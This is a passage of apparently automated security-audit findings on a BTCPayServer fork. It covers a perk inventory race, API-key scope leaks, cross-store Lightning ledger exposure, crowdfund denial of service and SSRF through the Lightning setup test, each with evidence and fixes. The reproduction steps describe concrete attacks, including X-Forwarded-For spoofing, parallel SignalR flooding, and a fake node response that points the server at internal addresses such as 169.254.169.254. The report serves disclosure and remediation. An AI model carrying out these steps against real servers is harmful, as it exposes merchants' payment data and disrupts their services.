2. [BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs:208–243](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs#L208-L243)
   After the check, the invoice is created through CreateInvoiceCoreRaw with Metadata.ItemCode = request.ChoiceKey and the app's internal tag; the decrement is only triggered by the InvoiceEvent.Created published once that invoice is saved.
3. [BTCPayServer/HostedServices/AppInventoryUpdaterHostedService.cs:28–69](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/AppInventoryUpdaterHostedService.cs#L28-L69)
   The decrement (Count 1 per invoice carrying an ItemCode, deduct -1 on Created, +1 on Expired/MarkedInvalid) is applied later by a sequential EventHostedServiceBase channel consumer on another thread, without re-checking availability.
4. [BTCPayServer/Services/Apps/AppService.cs:404–449](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppService.cs#L404-L449)
   UpdateInventory selects PerksTemplate for crowdfund apps, re-reads the row and applies `inventory += change.Delta` under an xmin optimistic retry. The retry prevents lost updates only; availability is never re-validated and there is no floor, so the stored counter goes negative.
5. [BTCPayServer/Controllers/UIInvoiceController.cs:247–295](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.cs#L247-L295)
   Rates are fetched over the network, payment prompts created and the invoice persisted before InvoiceEvent.Created is published at line 295, so the race window per request spans network latency.
6. [BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs:89–97](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs#L89-L97)
   HTTP entry point: anonymous POST /apps/{appId}/crowdfund (and '/' for a root-mapped app) with [IgnoreAntiforgeryToken], CORS All and only a per-RemoteAddress RateLimitsFilter(PublicInvoices) in front of the inventory check; no authentication or serialization.
7. [BTCPayServer/Services/Apps/AppHub.cs:39–47](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppHub.cs#L39-L47)
   Second entry point: the SignalR hub (mapped anonymously at Startup.cs:374 as /apps/hub) calls ContributeToCrowdfund as a plain method, so the MVC RateLimitsFilter and DomainMappingConstraint never run. SignalR processes invocations on one connection sequentially by default (no HubOptions set at Startup.cs:130), so the attacker opens N connections, each calling ListenToCrowdfundApp(appId) then CreateInvoice(model), with no throttle on connections or invocations.
8. [BTCPayServer/Hosting/Startup.cs:325–332](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L325-L332)
   UseForwardedHeaders with KnownProxies/KnownIPNetworks cleared: on the HTTP path the per-IP throttle key (RemoteIpAddress) is whatever X-Forwarded-For the client sends, so even that limit imposes no bound on concurrency.

## Impact
Merchant perk inventory integrity is defeated: a merchant-configured stock limit on a reward is bypassed (oversold, possibly paid, contributions) and the stored counter is driven negative. No confidentiality impact; no availability impact beyond the merchant's own listing.

## Reproduction steps
1. Unauthenticated attacker sends concurrent contributions for the last unit of an inventoried perk, either as parallel POSTs to /apps/{appId}/crowdfund (per-IP throttle admits several excess requests per burst and is keyed on a client-chosen X-Forwarded-For) or as CreateInvoice invocations over N anonymous SignalR connections to /apps/hub, which carry no rate limit. Each reads the same inventory snapshot and passes; each creates an invoice; decrements are applied later without re-validation or floor. The window spans a network rate fetch and prompt creation, so winning it is straightforward, but it remains a timing condition (AT:PRESENT).

## Recommended fix
1. In ContributeToCrowdfund, perk availability is checked against a stale in-memory snapshot of PerksTemplate and the reservation/decrement happens later in a different execution context (the InvoiceEvent consumer), so concurrent contributions all pass the same check. Fix criteria: Reserving a perk unit must be atomic with the availability check: a conditional decrement on the stored PerksTemplate that fails when inventory would go below zero, executed in the request before the invoice is persisted (released on Expired/MarkedInvalid), or equivalent per-app serialization applied on both the HTTP POST and the AppHub.CreateInvoice paths. Verify by firing concurrent contributions (over HTTP and over N hub connections) for a single remaining perk and asserting exactly one invoice is created.
2. AppService.UpdateInventory applies deltas to the PerksTemplate/Template item without a lower bound, so any over-admission is persisted as a negative count. Fix criteria: UpdateInventory (or the atomic reservation that replaces it) must refuse to drive inventory below zero and surface the failure to the caller; verify that the stored inventory never becomes negative under concurrent decrements.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Race condition
**CWE:** [CWE-367](https://cwe.mitre.org/data/definitions/367.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257454

---

# GET /api/v1/apps returns apps of every store the user belongs to, ignoring key scope and role

## Details
GET /api/v1/apps (GreenfieldAppsController.GetAllApps, lines 160-166) is protected by Policies.CanModifyStoreSettings with no store in its route. For such unscoped policies PermissionAuthorizationHandler accepts any API key that holds the permission on at least one store (anyScope: true, lines 56-65) and its comment delegates to the action the duty of 'only allowing StoreA to be shown in the list'. BuiltInPermissionHandler computes the set of stores where both the key scope and the caller's store role grant the permission (lines 51-65) and SetContextFilter (registered globally, Startup.cs:170) publishes it as HttpContext.GetStoresData() (SetContextFilter.cs:49-50).

The action ignores that set and calls AppService.GetAllApps(User.GetId(), includeArchived: true). Under API-key authentication User.GetId() is the key OWNER's user id (APIKeysAuthenticationHandler.cs:59), and GetAllApps (AppService.cs:251-289) joins every UserStore row of that user to Apps with no key-scope or role filter. So a key restricted to btcpay.store.canmodifystoresettings:StoreA — the least-privilege configuration the docs recommend ('API keys ... can be restricted by permission and store'; 'Request the narrowest useful permissions') and the one third parties obtain through /api-keys/authorize?selectiveStores=true — receives the id, name, type, storeId, archived flag and creation date of every app in every store the key owner belongs to, including stores the key was deliberately excluded from and stores where the owner is only Guest/Employee (roles without CanModifyStoreSettings, migration 20240229092905). The project defends exactly this boundary on the sibling list endpoint: GET /api/v1/stores filters by HttpContext.GetStoresData() (GreenfieldStoresController.cs:68) and GreenfieldAPITests.cs:1614-1616 asserts a key scoped to one store sees a single store — so with the same key the integrator cannot learn StoreB exists via /api/v1/stores, yet /api/v1/apps hands it StoreB's id and app inventory. With the app ids the holder can open the otherwise unlinked public PoS/crowdfund pages (/apps/{appId} redirects anonymously) and read their templates, prices and campaign data. The per-app Greenfield endpoints remain correctly scoped (appId -> StoreDataId scope resolution), so the leak is limited to app metadata and public app pages. This is the lead e4-apps-list-ignores-key-scope read to a conclusion.

## Evidence
1. [BTCPayServer/Controllers/GreenField/GreenfieldAppsController.cs:160–166](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldAppsController.cs#L160-L166)
   Unscoped CanModifyStoreSettings policy; the action returns _appService.GetAllApps(User.GetId(), includeArchived: true) without restricting the result to the stores the authorization layer permitted (HttpContext.GetStoresData()). This is the code the fix must change.
2. [BTCPayServer/Security/PermissionAuthorizationHandler.cs:56–65](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Security/PermissionAuthorizationHandler.cs#L56-L65)
   For a policy with no resolvable store scope, an API key holding the permission on ANY store passes (anyScope: true); the comment states the action is responsible for restricting the list to the permitted stores.
3. [BTCPayServer/Services/Apps/AppService.cs:251–288](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppService.cs#L251-L288)
   GetAllApps(userId) joins every UserStore row of the user to Apps; neither the API key's store scope nor the StoreRole permissions are applied, so Guest/Employee memberships and out-of-scope stores are included.
4. [BTCPayServer/Security/GreenField/APIKeysAuthenticationHandler.cs:59](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Security/GreenField/APIKeysAuthenticationHandler.cs#L59)
   API-key authentication puts the key owner's UserId into the identity, so User.GetId() in the action enumerates the owner's memberships, not the key's scope.
5. [BTCPayServer/Security/BuiltInPermissionHandler.cs:51–65](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Security/BuiltInPermissionHandler.cs#L51-L65)
   The handler computes the exact set of stores where both the key scope and the user's role grant the permission and stores it under StoresKey.
6. [BTCPayServer/Security/SetContextFilter.cs:49–50](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Security/SetContextFilter.cs#L49-L50)
   That set is exposed to actions as HttpContext.GetStoresData(); the apps list action never consults it.
7. [BTCPayServer/Controllers/GreenField/GreenfieldStoresController.cs:66–75](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldStoresController.cs#L66-L75)
   The sibling unscoped list endpoint GET /api/v1/stores correctly filters by HttpContext.GetStoresData(), showing the intended behaviour the apps list violates.
8. [BTCPayServer.Tests/GreenfieldAPITests.cs:1614–1616](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Tests/GreenfieldAPITests.cs#L1614-L1616)
   The project's own test asserts that a key scoped to one store (canviewstoresettings:StoreId) sees exactly one store from GET /api/v1/stores — the store-scope boundary the apps list does not honour.

## Impact
Discloses the existence (storeId) and app inventory (id, name, type, archived, created) of stores outside the key's scope and of stores where the owner's role would not permit viewing settings; the ids unlock otherwise-unlinked public PoS/crowdfund pages. Metadata only; per-app Greenfield endpoints stay scoped and nothing can be modified through this endpoint.

## Reproduction steps
1. The attacker is the holder of a Greenfield API key scoped to a single store (an integrator who obtained btcpay.store.canmodifystoresettings:StoreA, e.g. via /api-keys/authorize?selectiveStores=true). One unauthenticated-by-anything-else GET /api/v1/apps passes authorization because the key holds the permission on some store and returns apps from every store the key owner is a member of. No interaction, no special state, no race.

## Recommended fix
The unscoped list action GET /api/v1/apps enumerates apps by the key owner's user id instead of restricting the result to the stores the authorization handler permitted (HttpContext.GetStoresData()), and AppService.GetAllApps applies neither API-key scope nor store-role permission. Fix criteria: GET /api/v1/apps returns only apps belonging to stores where both the API key's scope and the caller's store role grant CanModifyStoreSettings (e.g. by filtering on HttpContext.GetStoresData() as GET /api/v1/stores does). Verify with a key scoped to one store whose owner also belongs to a second store (including as Guest): the response contains only the scoped store's apps.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Incorrect authorization
**CWE:** [CWE-863](https://cwe.mitre.org/data/definitions/863.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257453

---

# Store-scoped Lightning API returns the whole shared internal node's invoice and payment ledger to non-admin store members

## Details
The store-scoped Greenfield Lightning API (`/api/v1/stores/{storeId}/lightning/{cryptoCode}/...`) proxies to whichever node the store is configured with. `GreenfieldStoreLightningNodeApiController.GetLightningClient` (Store.cs:146-176) returns the server's shared internal node client (`LightningNetworkOptions.InternalLightningByCryptoCode`, the same raw `ILightningClient` BTCPay uses to create every internal-node store's invoices, LightningExtensions.cs:19-33) to any member authorized on the store, and requires the ServerAdmin role only when `doingAdminThings` is true (line 169). The base controller calls `GetLightningClient(cryptoCode, false)` for `GetInvoice` (317), `GetInvoices` (324), `GetPayments` (332), `GetPayment` (227) and `CreateInvoice` (340). A Lightning node has no notion of BTCPay stores: `ListInvoices`/`ListPayments` return the node's entire ledger and `GetInvoice(id)`/`GetPayment(hash)` return any record on the node; nothing filters the result to the store's own invoices or payouts. `ToModel` (398-433) copies amount, status, PaidAt, BOLT11 (whose description carries the other store's `{StoreName}`, `{ItemDescription}` and `{OrderId}` via `LightningDescriptionTemplate`, LightningLikePaymentHandler.cs:96-99), payment hash and preimage into the response.

Reachability: the invoice routes are gated only by `btcpay.store.canviewlightninginvoice` (Store.cs:114-128), which every built-in store role carries transitively (Owner/Manager/Employee/Guest all have `btcpay.store.canmodifyinvoices`, Migrations/20240229092905:50-60, which includes `cancreatelightninginvoice` -> `canviewlightninginvoice`, BTCPayServerServices.cs:562-566 and 657-661; PermissionService.ContainsPolicy walks the inclusion tree). The payment routes need `btcpay.store.canuselightningnode`, held by Owner/Manager via `canmodifystoresettings`. Two deployments expose the ledger: (a) the admin's own store on the internal node (the default way a BTCPay instance uses Lightning) with any non-admin member, who then reads the LN invoices of every other store on that node and all outgoing node payments; (b) multi-tenant sharing via the server policy `AllowLightningInternalNodeForAll` (off by default), which lets any self-registered user bind their own store to the internal node (`ValidatePaymentMethodConfig`, LightningLikePaymentHandler.cs:318-330, confirmed by LightningTests.cs:469-480) and then page through every other tenant's Lightning invoices with `GET /api/v1/stores/{ownStore}/lightning/BTC/invoices?offsetIndex=N`.

This is not conceded by a sanctioned path: the node-wide endpoints `/api/v1/server/lightning/{cryptoCode}/invoices|payments` require server-level policies that `BuiltInPermissionHandler` grants only to ServerAdmin (`case { Type: PolicyType.Server }: success = isAdmin`, lines 67-68), so the store-scoped controller is the only route by which a non-admin reaches another store's Lightning records. The project's own design keeps node-level data admin-only even in sharing mode (GetInfo/GetBalance/GetChannels pass `doingAdminThings=true`; Changelog #5639 'Hide LN Balance when using an internal node and not a server admin'; the payout processor refuses to spend from the internal node for non-admin-owned stores), and the permission text promises 'the lightning invoices connected to the selected stores'. The threat model lists store isolation and invoice data as protected assets and names cross-store access as a boundary.

Assumption: `BTCPayServer.Lightning.All` 1.7.13's `ListInvoices`/`ListPayments` implementations forward the backend's complete, unfiltered list and populate `Preimage` from the backend response (LND returns `r_preimage` for all invoices, including unsettled ones); the controller passes only PendingOnly/OffsetIndex, so no store filter can exist below it.

## Evidence
1. [BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.Store.cs:146–176](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.Store.cs#L146-L176)
   GetLightningClient resolves the store's Lightning config; when IsInternalNode it returns the shared internal node client to any authorized store member and requires ServerAdmin only when doingAdminThings is true (line 169). Nothing scopes the returned client or its results to the store.
2. [BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.cs:315–336](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.cs#L315-L336)
   GetInvoice (317), GetInvoices (324) and GetPayments (332) call GetLightningClient(cryptoCode, false), skipping the admin gate, and pass only PendingOnly/IncludePending/OffsetIndex to the node: the result is every invoice/payment on the node, for every store sharing it.
3. [BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.cs:225–230](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.cs#L225-L230)
   GetPayment(paymentHash) also uses doingAdminThings=false, returning any outgoing payment the internal node made (other stores' Lightning payouts, admin payments) to a store member holding CanUseLightningNodeInStore.
4. [BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.cs:398–433](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.cs#L398-L433)
   ToModel copies Preimage, BOLT11 (embedding the other store's description), amounts, status and timestamps into the response.
5. [BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.Store.cs:98–144](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.Store.cs#L98-L144)
   Route policies: invoice list/get require only the store-scoped CanViewLightningInvoiceInStore; payment list/get require the store-scoped CanUseLightningNodeInStore. No server-level policy is checked.
6. [BTCPayServer/Security/BuiltInPermissionHandler.cs:67–68](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Security/BuiltInPermissionHandler.cs#L67-L68)
   Server-level policies (including CanViewLightningInvoiceInternalNode used by /api/v1/server/lightning/...) succeed only for ServerAdmin, so the store-scoped controller is the only route by which a non-admin reaches the internal node's ledger; the project does not concede node-wide listing to non-admins elsewhere.
7. [BTCPayServer/Hosting/BTCPayServerServices.cs:562–566](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/BTCPayServerServices.cs#L562-L566)
   CanModifyInvoices includes CanCreateLightningInvoiceInStore, which (lines 657-661) includes CanViewLightningInvoiceInStore; the permission text (654-656) promises 'the lightning invoices connected to the selected stores'.
8. [BTCPayServer.Data/Migrations/20240229092905\_AddManagerAndEmployeeToStoreRoles.cs:50–60](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Data/Migrations/20240229092905_AddManagerAndEmployeeToStoreRoles.cs#L50-L60)
   Every built-in store role, including Guest, carries btcpay.store.canmodifyinvoices and therefore reaches the invoice listing endpoint.
9. [BTCPayServer/Payments/Lightning/LightningLikePaymentHandler.cs:318–330](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Lightning/LightningLikePaymentHandler.cs#L318-L330)
   A non-admin may bind their own store to the internal node when PoliciesSettings.AllowLightningInternalNodeForAll is enabled; this is the multi-tenant sharing mode in which other tenants' invoices live on the same node.
10. [BTCPayServer/Payments/Lightning/LightningExtensions.cs:19–33](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Lightning/LightningExtensions.cs#L19-L33)
   Every internal-node store's checkout invoices are created through the same shared ILightningClient from InternalLightningByCryptoCode, so those invoices are what the store API enumerates.
11. [BTCPayServer/Payments/Lightning/LightningLikePaymentHandler.cs:96–99](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Lightning/LightningLikePaymentHandler.cs#L96-L99)
   The BOLT11 description of each store's invoice is built from LightningDescriptionTemplate with {StoreName}, {ItemDescription} and {OrderId}, so the enumerated BOLT11s disclose the other store's business data.

## Impact
Complete read of every tenant's Lightning invoice and payment ledger on the shared node: amounts, timing, BOLT11 descriptions carrying store names/item descriptions/order ids, payment hashes, preimages, and outgoing payments (other stores' Lightning payouts). This is cross-store disclosure of business and payment data for all stores sharing the node (confidentiality HIGH). The code shows no path by which the disclosed preimages change server state, so integrity is rated NONE; no availability impact.

## Reproduction steps
1. Attacker: any authenticated user who is a member (any built-in role, including Guest) of a store bound to the server's internal node; in multi-tenant sharing mode (AllowLightningInternalNodeForAll) a self-registered user obtains this by creating a store and binding it to the internal node. They send ordinary authenticated GETs to the store Lightning invoices/payments endpoints with an API key or cookie carrying only store-scoped permissions. No defence intervenes: the route policy is store-scoped and the admin gate is skipped for these verbs. AT:PRESENT because the internal node must be shared by more than one store/user for cross-tenant data to exist (admin-bound store with non-admin members, or the sharing policy enabled).

## Recommended fix
The store-scoped Lightning API grants node-wide read operations (ListInvoices, GetInvoice, ListPayments, GetPayment) on the shared internal node to non-admin store members because those verbs are classified as non-admin (doingAdminThings=false) while the node cannot partition records by store. Fix criteria: A non-admin member of a store bound to the internal node must not be able to read Lightning invoices or payments that were not created for that store: either require ServerAdmin (as GetInfo/GetBalance/GetChannels already do) for invoice/payment listing and lookup when the store uses the internal node, or filter results to the invoice ids/payment hashes BTCPay's database associates with that store. Verify that GET .../lightning/{crypto}/invoices, .../invoices/{id}, .../payments and .../payments/{hash} from a non-admin member return only that store's records (or 403) when the store uses the internal node.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Broken Object Level Authorization
**CWE:** [CWE-863](https://cwe.mitre.org/data/definitions/863.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257451

---

# Hardcap crowdfund contributions blocked by anonymous unpaid invoice reservations

## Details
A crowdfund with 'Do not allow additional contributions after target has been reached' (EnforceTargetAmount) computes its progress with softcap=false, in which mode InvoiceRepository.GetContributionsByPaymentMethodId counts the full Price of every invoice that is still in status New (unpaid) as 'pending' (lines 955-960). UICrowdfundController.ContributeToCrowdfund then (a) refuses every non-admin contribution once pending+settled >= 100% (lines 113-121) and (b) caps a single contribution at TargetAmount minus settled minus pending (lines 202-206).

Because invoice creation is anonymous and requires no payment, any network client can POST /apps/{appId}/crowdfund (or call the AppHub CreateInvoice method, which bypasses the MVC rate-limit filter entirely) with Amount equal to the currently remaining target. The resulting unpaid invoice immediately drives PendingProgressPercentage to 100%, and from that moment every legitimate contributor receives 'Crowdfund is not currently active' until the invoice expires (store default 15 minutes, StoreBlob.cs:23). The attacker never pays; when the invoice expires they create another one, keeping the campaign permanently closed. Several smaller invoices work the same way (each is counted at its Price). The merchant sees the public progress bar pinned at 100% pending and receives no contributions; the invoice list shows only anonymous unpaid invoices.

The root cause is that capacity in an enforced-target campaign is reserved for unauthenticated parties at invoice creation with no commitment, no per-client limit and no distinction between reservations and payments when gating new contributions. The maintainers' test (CrowdfundTests.cs:233-247) shows the pending-counting behaviour is intentional, but the gating consequence is not addressed anywhere.

Preconditions: the merchant enabled EnforceTargetAmount (non-default). No authentication or user interaction is needed. The hub path (AppHub.cs:39-65) removes even the per-IP throttle, but a single request suffices.

## Evidence
1. [BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs:113–121](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs#L113-L121)
   When EnforceTargetAmount is set, every non-admin contribution is refused as soon as PendingProgressPercentage + ProgressPercentage >= 100. Pending includes unpaid invoices.
2. [BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs:202–206](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs#L202-L206)
   A single contribution may be as large as TargetAmount - (CurrentAmount + CurrentPendingAmount), so one request can claim the whole remaining target.
3. [BTCPayServer/Services/Invoices/InvoiceRepository.cs:955–959](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Invoices/InvoiceRepository.cs#L955-L959)
   Under hardcap (softcap == false) every invoice still in status New adds its full Price to totalProcessingCurrency - the reservation is granted at invoice creation, before any payment.
4. [BTCPayServer/Plugins/Crowdfund/CrowdfundPlugin.cs:153–155](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/CrowdfundPlugin.cs#L153-L155)
   GetInfo collects all invoices of the app (any status) and feeds them to GetContributionsByPaymentMethodId with softcap = !EnforceTargetAmount; the result drives CurrentPendingAmount/PendingProgressPercentage used by the gate above.
5. [BTCPayServer/Services/Apps/AppHub.cs:39–65](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppHub.cs#L39-L65)
   AppHub.CreateInvoice (reachable anonymously at /apps/hub after ListenToCrowdfundApp) invokes ContributeToCrowdfund directly, so RateLimitsFilter(PublicInvoices) and DomainMappingConstraint on the MVC action do not run; an anonymous client can create the blocking invoices without the 4 req/min throttle (one request per expiry window suffices on either path).
6. [BTCPayServer/Data/StoreBlob.cs:23](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Data/StoreBlob.cs#L23)
   Default invoice expiration is 15 minutes: each free reservation blocks the campaign for that long and can simply be renewed.
7. [BTCPayServer.Tests/CrowdfundTests.cs:233–246](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Tests/CrowdfundTests.cs#L233-L246)
   Maintainers assert that unpaid invoices count as pending contributions under hardcap - the reservation semantics are intended, but the test never considers an attacker reserving the whole target.

## Impact
The crowdfund's core function (accepting contributions) is denied to all legitimate payers for as long as the attacker renews the free reservation; the rest of the server keeps working, so availability impact on the system is partial. No data is disclosed or modified.

## Reproduction steps
1. Anonymous attacker loads the public crowdfund page (which exposes targetAmount, currentAmount, currentPendingAmount in srvModel), then POSTs a contribution for the remaining amount, or sends CreateInvoice over /apps/hub. The unpaid invoice is created and counted as pending; all other contributors are refused until it expires, when the attacker repeats. Requires the campaign to have EnforceTargetAmount enabled (AT:PRESENT).

## Recommended fix
Under hardcap, unpaid (New) invoices created by anonymous parties are counted as pending contributions and used to refuse further contributions, so unfunded reservations block the campaign. Fix criteria: Gating of new contributions must not be driven by unpaid, uncommitted invoices created by unauthenticated parties: either exclude New invoices from the gate (count only paid/processing), or bound reservations (short lifetime, per-IP/per-session limit, release on checkout abandonment). Verify by creating an unpaid invoice for the remaining target and confirming other clients can still contribute.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Denial of service
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257450

---

# Lightning setup test opens raw TCP connections to host:port advertised by the remote node

## Details
On `POST /stores/{storeId}/lightning/{cryptoCode}/setup` with `command=test` (UIStoresController.LightningLike.cs:198-218), BTCPay creates a client for the store-submitted connection string, calls `GetNodeInfo` (LightningLikePaymentHandler.cs:145-206) and, unless the user ticks `SkipPortTest`, passes `info.First()` to `TestConnection` (LightningLikePaymentHandler.cs:213-226). `NodeInfoList` is copied verbatim from the remote node's `GetInfo` response (lines 182-185; only the Tor/clearnet preference filters it), so the host:port is authored by the remote node, i.e. by the store member who chose it. `TestConnection` parses that host:port with `Utils.TryParseEndpoint` and hands it to `SocketFactory.ConnectAsync` (SocketFactory.cs:20-43), which opens a plain TCP connection from the server's network position (DNS resolution for hostnames, SOCKS only for .onion). No `IsLocalNetwork`/`IsPublicAddress` check is applied anywhere on this second hop.

The first hop is guarded for non-admins: `ValidatePaymentMethodConfig` (lines 275-290) rejects connection strings that `IsSafeLightningConnectionString` deems local and forces `AllowUnsafeConnection=false`, which selects the `lightning.safe` HttpClient whose SSRF `ConnectCallback` skips every private resolved address without attempting a connection (SSRFProtectionExtensions.cs:45-51). A hostile tenant therefore points the connection string at a public HTTPS endpoint emulating LND REST `/v1/getinfo` with `uris: ["<pubkey>@10.0.0.5:5432"]` (or `postgres:5432`, `127.0.0.1:24736`, `169.254.169.254:80`, ...), clicks Test, and the server TCP-connects to that internal endpoint — the exact reach the first-hop guard exists to deny.

